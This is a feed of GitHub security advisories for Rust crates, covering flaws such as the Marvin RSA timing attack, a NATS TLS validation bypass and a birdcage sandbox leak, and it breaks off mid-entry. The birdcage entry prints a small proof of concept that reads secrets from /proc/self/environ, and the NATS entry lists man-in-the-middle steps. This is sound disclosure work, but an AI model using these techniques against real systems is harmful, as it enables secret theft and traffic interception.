<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/rust.rss</id>
    <title>Security Advisory for Rust crates</title>
    <updated>2023-12-06T19:01:22.951Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arust"/>
    <subtitle>Security Advisory for Rust crates on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[rsa] Marvin Attack: potential key recovery through timing sidechannels]]></title>
        <id>https://github.com/advisories/GHSA-4grx-2x9w-596c</id>
        <link href="https://github.com/advisories/GHSA-4grx-2x9w-596c"/>
        <updated>2023-12-06T18:50:52.000Z</updated>
        <content type="html"><![CDATA[<p>The <a href="https://people.redhat.com/~hkario/marvin/">Marvin Attack</a> is a timing sidechannel vulnerability which allows performing RSA decryption and signing operations as an attacker with the ability to observe only the time of the decryption operation performed withthe private key.</p>
<p>A recent survey of RSA implementations found that the Rust <code>rsa</code> crate is one of many implementations vulnerable to this attack.</p>
<p>No fixed version is available at this time.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/RustCrypto/RSA/security/advisories/GHSA-c38w-74pg-36hr">https://github.com/RustCrypto/RSA/security/advisories/GHSA-c38w-74pg-36hr</a></li>
<li><a href="https://github.com/RustCrypto/RSA/issues/19#issuecomment-1822995643">https://github.com/RustCrypto/RSA/issues/19#issuecomment-1822995643</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2023-0071.html">https://rustsec.org/advisories/RUSTSEC-2023-0071.html</a></li>
<li><a href="https://github.com/advisories/GHSA-4grx-2x9w-596c">https://github.com/advisories/GHSA-4grx-2x9w-596c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4grx-2x9w-596c</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-11-28T23:28:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rsa] Marvin Attack: potential key recovery through timing sidechannels]]></title>
        <id>https://github.com/advisories/GHSA-c38w-74pg-36hr</id>
        <link href="https://github.com/advisories/GHSA-c38w-74pg-36hr"/>
        <updated>2023-12-06T18:50:49.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Due to a non-constant-time implementation, information about the private key is leaked through timing information which is observable over the network. An attacker may be able to use that information to recover the key.</p>
<h3 id="patches">Patches</h3>
<p>No patch is yet available, however work is underway to migrate to a fully constant-time implementation.</p>
<h3 id="workarounds">Workarounds</h3>
<p>The only currently available workaround is to avoid using the <code>rsa</code> crate in settings where attackers are able to observe timing information, e.g. local use on a non-compromised computer is fine.</p>
<h3 id="references">References</h3>
<p>This vulnerability was discovered as part of the "Marvin Attack", which revealed several implementations of RSA including OpenSSL had not properly mitigated timing sidechannel attacks.</p>
<ul>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2023-0071.html">https://rustsec.org/advisories/RUSTSEC-2023-0071.html</a></li>
<li><a href="https://people.redhat.com/~hkario/marvin/">https://people.redhat.com/~hkario/marvin/</a></li>
<li><a href="https://github.com/RustCrypto/RSA/issues/19">https://github.com/RustCrypto/RSA/issues/19</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/RustCrypto/RSA/security/advisories/GHSA-c38w-74pg-36hr">https://github.com/RustCrypto/RSA/security/advisories/GHSA-c38w-74pg-36hr</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-49092">https://nvd.nist.gov/vuln/detail/CVE-2023-49092</a></li>
<li><a href="https://github.com/RustCrypto/RSA/issues/19#issuecomment-1822995643">https://github.com/RustCrypto/RSA/issues/19#issuecomment-1822995643</a></li>
<li><a href="https://github.com/advisories/GHSA-c38w-74pg-36hr">https://github.com/advisories/GHSA-c38w-74pg-36hr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c38w-74pg-36hr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-11-28T23:28:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pubnub] pubnub Insufficient Entropy vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-5844-q3fc-56rh</id>
        <link href="https://github.com/advisories/GHSA-5844-q3fc-56rh"/>
        <updated>2023-12-06T17:40:03.000Z</updated>
        <content type="html"><![CDATA[<p>Versions of the package pubnub before 7.4.0; all versions of the package com.pubnub:pubnub; versions of the package pubnub before 6.19.0; all versions of the package github.com/pubnub/go; versions of the package github.com/pubnub/go/v7 before 7.2.0; versions of the package pubnub before 7.3.0; versions of the package pubnub/pubnub before 6.1.0; versions of the package pubnub before 5.3.0; versions of the package pubnub before 0.4.0; versions of the package pubnub/c-core before 4.5.0; versions of the package com.pubnub:pubnub-kotlin before 7.7.0; versions of the package pubnub/swift before 6.2.0; versions of the package pubnub before 5.2.0; versions of the package pubnub before 4.3.0 are vulnerable to Insufficient Entropy via the getKey function, due to inefficient implementation of the AES-256-CBC cryptographic algorithm. The provided encrypt function is less secure when hex encoding and trimming are applied, leaving half of the bits in the key always the same for every encoded message or file.</p>
<p><strong>Note:</strong></p>
<p>In order to exploit this vulnerability, the attacker needs to invest resources in preparing the attack and brute-force the encryption.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-26154">https://nvd.nist.gov/vuln/detail/CVE-2023-26154</a></li>
<li><a href="https://github.com/pubnub/javascript/commit/fb6cd0417cbb4ba87ea2d5d86a9c94774447e119">https://github.com/pubnub/javascript/commit/fb6cd0417cbb4ba87ea2d5d86a9c94774447e119</a></li>
<li><a href="https://gist.github.com/vargad/20237094fce7a0a28f0723d7ce395bb0">https://gist.github.com/vargad/20237094fce7a0a28f0723d7ce395bb0</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-COCOAPODS-PUBNUB-6098384">https://security.snyk.io/vuln/SNYK-COCOAPODS-PUBNUB-6098384</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-DOTNET-PUBNUB-6098372">https://security.snyk.io/vuln/SNYK-DOTNET-PUBNUB-6098372</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMPUBNUBGO-6098373">https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMPUBNUBGO-6098373</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMPUBNUBGOV7-6098374">https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMPUBNUBGOV7-6098374</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JAVA-COMPUBNUB-6098371">https://security.snyk.io/vuln/SNYK-JAVA-COMPUBNUB-6098371</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JAVA-COMPUBNUB-6098380">https://security.snyk.io/vuln/SNYK-JAVA-COMPUBNUB-6098380</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JS-PUBNUB-5840690">https://security.snyk.io/vuln/SNYK-JS-PUBNUB-5840690</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-PHP-PUBNUBPUBNUB-6098376">https://security.snyk.io/vuln/SNYK-PHP-PUBNUBPUBNUB-6098376</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-PUB-PUBNUB-6098385">https://security.snyk.io/vuln/SNYK-PUB-PUBNUB-6098385</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-PYTHON-PUBNUB-6098375">https://security.snyk.io/vuln/SNYK-PYTHON-PUBNUB-6098375</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-RUBY-PUBNUB-6098377">https://security.snyk.io/vuln/SNYK-RUBY-PUBNUB-6098377</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-RUST-PUBNUB-6098378">https://security.snyk.io/vuln/SNYK-RUST-PUBNUB-6098378</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-SWIFT-PUBNUBSWIFT-6098381">https://security.snyk.io/vuln/SNYK-SWIFT-PUBNUBSWIFT-6098381</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-UNMANAGED-PUBNUBCCORE-6098379">https://security.snyk.io/vuln/SNYK-UNMANAGED-PUBNUBCCORE-6098379</a></li>
<li><a href="https://github.com/pubnub/javascript/blob/master/src/crypto/modules/web.js#L70">https://github.com/pubnub/javascript/blob/master/src/crypto/modules/web.js#L70</a></li>
<li><a href="https://github.com/advisories/GHSA-5844-q3fc-56rh">https://github.com/advisories/GHSA-5844-q3fc-56rh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5844-q3fc-56rh</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-12-06T06:30:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tokio-boring] tokio-boring vulnerable to resource exhaustion via memory leak]]></title>
        <id>https://github.com/advisories/GHSA-pjrj-h4fg-6gm4</id>
        <link href="https://github.com/advisories/GHSA-pjrj-h4fg-6gm4"/>
        <updated>2023-12-05T23:42:49.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The tokio-boring library in version 4.0.0 is affected by a memory leak issue that can lead to excessive resource consumption and potential DoS by resource exhaustion. The <code>set_ex_data</code> function used by the library did not deallocate memory used by pre-existing data in memory each time after completing a TLS connection causing the program to consume more resources with each new connection.</p>
<h3 id="patches">Patches</h3>
<p>The issue is fixed in version 4.1.0 of tokio-boring.</p>
<h3 id="references">References</h3>
<p><a href="https://www.cve.org/CVERecord?id=CVE-2023-6180">CVE-2023-6180 at cve.org</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/cloudflare/boring/security/advisories/GHSA-pjrj-h4fg-6gm4">https://github.com/cloudflare/boring/security/advisories/GHSA-pjrj-h4fg-6gm4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-6180">https://nvd.nist.gov/vuln/detail/CVE-2023-6180</a></li>
<li><a href="https://github.com/cloudflare/boring/commit/a32783374f2682e6949fdb713910b1b9f103d3ed">https://github.com/cloudflare/boring/commit/a32783374f2682e6949fdb713910b1b9f103d3ed</a></li>
<li><a href="https://github.com/advisories/GHSA-pjrj-h4fg-6gm4">https://github.com/advisories/GHSA-pjrj-h4fg-6gm4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pjrj-h4fg-6gm4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-12-05T23:42:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[birdcage] Environment variables still accessible through /proc]]></title>
        <id>https://github.com/advisories/GHSA-wj7f-468m-6mv8</id>
        <link href="https://github.com/advisories/GHSA-wj7f-468m-6mv8"/>
        <updated>2023-12-01T22:46:37.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Environment variables can be read from procfs unless a new process is started.</p>
<h3 id="poc">PoC</h3>
<pre><code>use birdcage::{Birdcage, Sandbox};
use std::{env, fs};

fn main() {
    Birdcage::new().lock().unwrap();

    assert_eq!(env::var_os("SECRET"), None);

    let environ = fs::read_to_string("/proc/self/environ").unwrap();
    assert!(!environ.contains("SECRET"), "ENVIRON CONTAINS SECRET:\n{environ}");
}
</code></pre>
<pre><code>$  SECRET=test cargo run
thread 'main' panicked at src/main.rs:10:5:
ENVIRON CONTAINS SECRET:
 [truncated]
</code></pre>
<h3 id="possible-solutions">Possible Solutions</h3>
<p>The simplest solution would be relying on the ptrace isolation and <strong>always</strong> spawning a new process by changing birdcage's API to create a new command. With an additional PID namespace the guarantees could be even further reinforced.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/phylum-dev/birdcage/security/advisories/GHSA-wj7f-468m-6mv8">https://github.com/phylum-dev/birdcage/security/advisories/GHSA-wj7f-468m-6mv8</a></li>
<li><a href="https://github.com/advisories/GHSA-wj7f-468m-6mv8">https://github.com/advisories/GHSA-wj7f-468m-6mv8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wj7f-468m-6mv8</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-12-01T22:46:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openssl] `openssl` `X509StoreRef::objects` is unsound]]></title>
        <id>https://github.com/advisories/GHSA-xphf-cx8h-7q9g</id>
        <link href="https://github.com/advisories/GHSA-xphf-cx8h-7q9g"/>
        <updated>2023-11-28T20:51:10.000Z</updated>
        <content type="html"><![CDATA[<p>This function returned a reference into an OpenSSL datastructure, but there was no way to ensure OpenSSL would not mutate the datastructure behind one's back.</p>
<p>Use of this function should be replaced with <code>X509StoreRef::all_certificates</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sfackler/rust-openssl/issues/2096">https://github.com/sfackler/rust-openssl/issues/2096</a></li>
<li><a href="https://github.com/sfackler/rust-openssl/commit/cf9681a55cabd4cb9f1475bde17b5079f2a0384e">https://github.com/sfackler/rust-openssl/commit/cf9681a55cabd4cb9f1475bde17b5079f2a0384e</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2023-0072.html">https://rustsec.org/advisories/RUSTSEC-2023-0072.html</a></li>
<li><a href="https://github.com/advisories/GHSA-xphf-cx8h-7q9g">https://github.com/advisories/GHSA-xphf-cx8h-7q9g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xphf-cx8h-7q9g</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-11-28T20:51:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[self_cell] Insufficient covariance check makes self_cell unsound]]></title>
        <id>https://github.com/advisories/GHSA-48m6-wm5p-rr6h</id>
        <link href="https://github.com/advisories/GHSA-48m6-wm5p-rr6h"/>
        <updated>2023-11-14T18:32:22.000Z</updated>
        <content type="html"><![CDATA[<p>All public versions prior to <code>1.02</code> used an insufficient check to ensure that users correctly marked the dependent type as either <code>covariant</code> or <code>not_covariant</code>. This allowed users to mark a dependent as covariant even though its type was not covariant but invariant, for certain invariant types involving trait object lifetimes. One example for such a dependent type is <code>type Dependent&lt;'a&gt; = RefCell&lt;Box&lt;dyn fmt::Display + 'a&gt;&gt;</code>. Such a type allowed unsound usage in purely safe user code that leads to undefined behavior. The patched versions now produce a compile time error if such a type is marked as <code>covariant</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Voultapher/self_cell/issues/49">https://github.com/Voultapher/self_cell/issues/49</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2023-0070.html">https://rustsec.org/advisories/RUSTSEC-2023-0070.html</a></li>
<li><a href="https://github.com/advisories/GHSA-48m6-wm5p-rr6h">https://github.com/advisories/GHSA-48m6-wm5p-rr6h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-48m6-wm5p-rr6h</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-11-14T18:32:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[self_cell] Insufficient covariance check makes self_cell unsound]]></title>
        <id>https://github.com/advisories/GHSA-48m6-wm5p-rr6h</id>
        <link href="https://github.com/advisories/GHSA-48m6-wm5p-rr6h"/>
        <updated>2023-11-14T18:32:22.000Z</updated>
        <content type="html"><![CDATA[<p>All public versions prior to <code>1.02</code> used an insufficient check to ensure that users correctly marked the dependent type as either <code>covariant</code> or <code>not_covariant</code>. This allowed users to mark a dependent as covariant even though its type was not covariant but invariant, for certain invariant types involving trait object lifetimes. One example for such a dependent type is <code>type Dependent&lt;'a&gt; = RefCell&lt;Box&lt;dyn fmt::Display + 'a&gt;&gt;</code>. Such a type allowed unsound usage in purely safe user code that leads to undefined behavior. The patched versions now produce a compile time error if such a type is marked as <code>covariant</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Voultapher/self_cell/issues/49">https://github.com/Voultapher/self_cell/issues/49</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2023-0070.html">https://rustsec.org/advisories/RUSTSEC-2023-0070.html</a></li>
<li><a href="https://github.com/advisories/GHSA-48m6-wm5p-rr6h">https://github.com/advisories/GHSA-48m6-wm5p-rr6h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-48m6-wm5p-rr6h</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-11-14T18:32:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nats] NATS TLS certificate common name validation bypass]]></title>
        <id>https://github.com/advisories/GHSA-wvc4-j7g5-4f79</id>
        <link href="https://github.com/advisories/GHSA-wvc4-j7g5-4f79"/>
        <updated>2023-11-08T17:39:22.000Z</updated>
        <content type="html"><![CDATA[<p>The NATS official Rust clients are vulnerable to MitM when using TLS.</p>
<p>A fix for the <code>nats</code> crate hasn't been released yet. Since the <code>nats</code> crate is going to be deprecated anyway, consider switching to <code>async-nats</code> <code>&gt;= 0.29</code> which already fixed this vulnerability.</p>
<p>The common name of the server's TLS certificate is validated against the <code>host</code>name provided by the server's plaintext <code>INFO</code> message during the initial connection setup phase. A MitM proxy can tamper with the <code>host</code> field's value by substituting it with the common name of a valid certificate it controls, fooling the client into accepting it.</p>
<h2 id="reproduction-steps">Reproduction steps</h2>
<ol>
<li>The NATS Rust client tries to establish a new connection</li>
<li>The connection is intercepted by a MitM proxy</li>
<li>The proxy makes a separate connection to the NATS server</li>
<li>The NATS server replies with an <code>INFO</code> message</li>
<li>The proxy reads the <code>INFO</code>, alters the <code>host</code> JSON field and passes the tampered <code>INFO</code> back to the client</li>
<li>The proxy upgrades the client connection to TLS, presenting a certificate issued by a certificate authority present in the client's keychain. In the previous step the <code>host</code> was set to the common name of said certificate</li>
<li><code>rustls</code> accepts the certificate, having verified that the common name matches the attacker-controlled value it was given</li>
<li>The client has been fooled by the MitM proxy into accepting the attacker-controlled certificate</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nats-io/nats.rs/pull/881">https://github.com/nats-io/nats.rs/pull/881</a></li>
<li><a href="https://github.com/nats-io/nats.rs/pull/887">https://github.com/nats-io/nats.rs/pull/887</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2023-0029.html">https://rustsec.org/advisories/RUSTSEC-2023-0029.html</a></li>
<li><a href="https://github.com/nats-io/nats.rs/commit/9bacb86a480803ece9d1a45aa443081cf1eb815c">https://github.com/nats-io/nats.rs/commit/9bacb86a480803ece9d1a45aa443081cf1eb815c</a></li>
<li><a href="https://github.com/advisories/GHSA-wvc4-j7g5-4f79">https://github.com/advisories/GHSA-wvc4-j7g5-4f79</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wvc4-j7g5-4f79</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-03-27T21:12:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[s2n-quic] s2n-quic potential denial of service via crafted stream frames]]></title>
        <id>https://github.com/advisories/GHSA-475v-pq2g-fp9g</id>
        <link href="https://github.com/advisories/GHSA-475v-pq2g-fp9g"/>
        <updated>2023-11-08T15:03:12.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An issue in s2n-quic could result in unnecessary resource utilization when peers open streams beyond advertised limits.</p>
<p>Impacted versions: &lt;= v1.30.0.</p>
<h3 id="patches">Patches</h3>
<p>The patch is included in v1.31.0 [1].</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no workaround. Applications using s2n-quic should upgrade to the most recent release of s2n-quic.</p>
<p>If you have any questions or comments about this advisory, we ask that you contact AWS Security via our vulnerability reporting page [2] or directly via email to <a href="mailto:aws-security@amazon.com">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</p>
<p>[1] <a href="https://github.com/aws/s2n-quic/releases/tag/v1.31.0">https://github.com/aws/s2n-quic/releases/tag/v1.31.0</a>
[2] <a href="https://aws.amazon.com/security/vulnerability-reporting">https://aws.amazon.com/security/vulnerability-reporting</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/aws/s2n-quic/security/advisories/GHSA-475v-pq2g-fp9g">https://github.com/aws/s2n-quic/security/advisories/GHSA-475v-pq2g-fp9g</a></li>
<li><a href="https://github.com/aws/s2n-quic/commit/73e66b066de4940d129dbf33d91c39170eb4c38d">https://github.com/aws/s2n-quic/commit/73e66b066de4940d129dbf33d91c39170eb4c38d</a></li>
<li><a href="https://github.com/aws/s2n-quic/releases/tag/v1.31.0">https://github.com/aws/s2n-quic/releases/tag/v1.31.0</a></li>
<li><a href="https://github.com/advisories/GHSA-475v-pq2g-fp9g">https://github.com/advisories/GHSA-475v-pq2g-fp9g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-475v-pq2g-fp9g</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2023-11-08T15:03:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rusty-paseto] rusty_paseto vulnerable to private key extraction due to ed25519-dalek dependency]]></title>
        <id>https://github.com/advisories/GHSA-j57r-4qw6-58r3</id>
        <link href="https://github.com/advisories/GHSA-j57r-4qw6-58r3"/>
        <updated>2023-11-07T23:44:26.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>The vulnerability, known as RUSTSEC-2022-0093, impacts the <code>ed25519-dalek</code> crate, which is a dependency of the <code>rusty-paseto</code> crate. This issue arises from a "Double Public Key Signing Function Oracle Attack" affecting versions of <code>ed25519-dalek</code> prior to v2.0. These versions expose an unsafe API for serializing and deserializing 64-byte keypairs that include both private and public keys, creating potential for certain attacks. <code>d25519-dalek</code> users utilizing these serialization and deserialization functions directly could potentially be impacted. </p>
<h2 id="patches">Patches</h2>
<p>The vulnerability within the <code>ed25519-dalek</code> crate has been addressed in version 2.0. <code>rusty-paseto</code> has addressed it in release v0.6.0. </p>
<h2 id="workarounds">Workarounds</h2>
<p>Users are recommended to upgrade to v0.6.0 of <code>rusty-paseto</code>. However, users should still ensure that their key serialization and deserialization practices are secure and avoid any practices that could lead to key exposure.</p>
<h2 id="references">References</h2>
<p>More information about RUSTSEC-2022-0093 can be found in the <a href="https://rustsec.org/advisories/RUSTSEC-2022-0093.html">RustSec Advisory Database</a>. Updates and details regarding the upcoming release of <code>rusty-paseto</code> will be documented in the project's <a href="https://github.com/your-repo/rusty-paseto/releases">releases</a> and <a href="https://github.com/your-repo/rusty-paseto/blob/main/CHANGELOG.md">changelog</a>.  This issue was first reported by Dependabot on 2023-08-15. The source was reviewed by @rrrodzilla at that time and a determination was made that the vulnerability low harm to existing users due to the strongly typed nature of keys provided by the rusty-paseto API. @techport-om reported the vulnerability to the repository by discovering during a <code>cargo-audit</code> run on 2023-11-05 and opened <a href="https://github.com/rrrodzilla/rusty_paseto/issues/28">issue 28</a>. This advisory was created at that time to notify existing users.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/rrrodzilla/rusty_paseto/security/advisories/GHSA-j57r-4qw6-58r3">https://github.com/rrrodzilla/rusty_paseto/security/advisories/GHSA-j57r-4qw6-58r3</a></li>
<li><a href="https://github.com/rrrodzilla/rusty_paseto/commit/42718c1b757c1dfabb80621f2f48b8268f7fa24e">https://github.com/rrrodzilla/rusty_paseto/commit/42718c1b757c1dfabb80621f2f48b8268f7fa24e</a></li>
<li><a href="https://github.com/rrrodzilla/rusty_paseto/releases/tag/v0.6.0">https://github.com/rrrodzilla/rusty_paseto/releases/tag/v0.6.0</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2022-0093.html">https://rustsec.org/advisories/RUSTSEC-2022-0093.html</a></li>
<li><a href="https://github.com/advisories/GHSA-j57r-4qw6-58r3">https://github.com/advisories/GHSA-j57r-4qw6-58r3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j57r-4qw6-58r3</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2023-11-07T23:44:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[failure] Type confusion if __private_get_type_id__ is overriden]]></title>
        <id>https://github.com/advisories/GHSA-jq66-xh47-j9f3</id>
        <link href="https://github.com/advisories/GHSA-jq66-xh47-j9f3"/>
        <updated>2023-11-02T22:50:48.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in the failure crate through 0.1.5 for Rust. It has a type confusion flaw when downcasting. NOTE: This vulnerability only affects products that are no longer supported by the maintainer.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-25575">https://nvd.nist.gov/vuln/detail/CVE-2020-25575</a></li>
<li><a href="https://github.com/rust-lang-nursery/failure/issues/336">https://github.com/rust-lang-nursery/failure/issues/336</a></li>
<li><a href="https://github.com/RustCrypto/hashes/pull/91">https://github.com/RustCrypto/hashes/pull/91</a></li>
<li><a href="https://boats.gitlab.io/blog/post/failure-to-fehler/">https://boats.gitlab.io/blog/post/failure-to-fehler/</a></li>
<li><a href="https://github.com/RustSec/advisory-db/blob/main/crates/failure/RUSTSEC-2019-0036.md">https://github.com/RustSec/advisory-db/blob/main/crates/failure/RUSTSEC-2019-0036.md</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2019-0036.html">https://rustsec.org/advisories/RUSTSEC-2019-0036.html</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2020-0036.html">https://rustsec.org/advisories/RUSTSEC-2020-0036.html</a></li>
<li><a href="https://github.com/advisories/GHSA-jq66-xh47-j9f3">https://github.com/advisories/GHSA-jq66-xh47-j9f3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jq66-xh47-j9f3</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2022-06-16T23:06:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[stellar-strkey] stellar-strkey vulnerable to panic in SignedPayload::from_payload]]></title>
        <id>https://github.com/advisories/GHSA-5873-6fwq-463f</id>
        <link href="https://github.com/advisories/GHSA-5873-6fwq-463f"/>
        <updated>2023-11-09T05:04:31.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Panic vulnerability when a specially crafted payload is used. 
This is because of the following calculation:</p>
<pre><code class="language-rust">inner_payload_len + (4 - inner_payload_len % 4) % 4
</code></pre>
<p>If <code>inner_payload_len</code> is <code>0xffffffff</code>, <code>(4 - inner_payload_len % 4) % 4 = 1</code> so</p>
<pre><code class="language-rust">inner_payload_len + (4 - inner_payload_len % 4) % 4 = u32::MAX + 1
</code></pre>
<p>which overflow.</p>
<h3 id="patches">Patches</h3>
<p>Check that <code>inner_payload_len</code> is not above 64 which should never be the case.
Patched in version 0.0.8</p>
<h3 id="workarounds">Workarounds</h3>
<p>Sanitize input payload before it is passed to the vulnerable function so that bytes in <code>payload[32..32+4]</code> and parsed as a <code>u32</code> is not above 64.</p>
<h3 id="references">References</h3>
<p>GitHub issue #58</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/stellar/rs-stellar-strkey/security/advisories/GHSA-5873-6fwq-463f">https://github.com/stellar/rs-stellar-strkey/security/advisories/GHSA-5873-6fwq-463f</a></li>
<li><a href="https://github.com/stellar/rs-stellar-strkey/issues/58">https://github.com/stellar/rs-stellar-strkey/issues/58</a></li>
<li><a href="https://github.com/stellar/rs-stellar-strkey/pull/59">https://github.com/stellar/rs-stellar-strkey/pull/59</a></li>
<li><a href="https://github.com/stellar/rs-stellar-strkey/commit/83adad0f5b1cda693c7ba8524d395add8077865f">https://github.com/stellar/rs-stellar-strkey/commit/83adad0f5b1cda693c7ba8524d395add8077865f</a></li>
<li><a href="https://github.com/stellar/rs-stellar-strkey/releases/tag/v0.0.8">https://github.com/stellar/rs-stellar-strkey/releases/tag/v0.0.8</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-46135">https://nvd.nist.gov/vuln/detail/CVE-2023-46135</a></li>
<li><a href="https://github.com/advisories/GHSA-5873-6fwq-463f">https://github.com/advisories/GHSA-5873-6fwq-463f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5873-6fwq-463f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-10-25T14:09:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cocoon] Sequential calls of encryption API (`encrypt`, `wrap`, and `dump`) result in nonce reuse]]></title>
        <id>https://github.com/advisories/GHSA-6878-6wc2-pf5h</id>
        <link href="https://github.com/advisories/GHSA-6878-6wc2-pf5h"/>
        <updated>2023-10-24T19:22:26.000Z</updated>
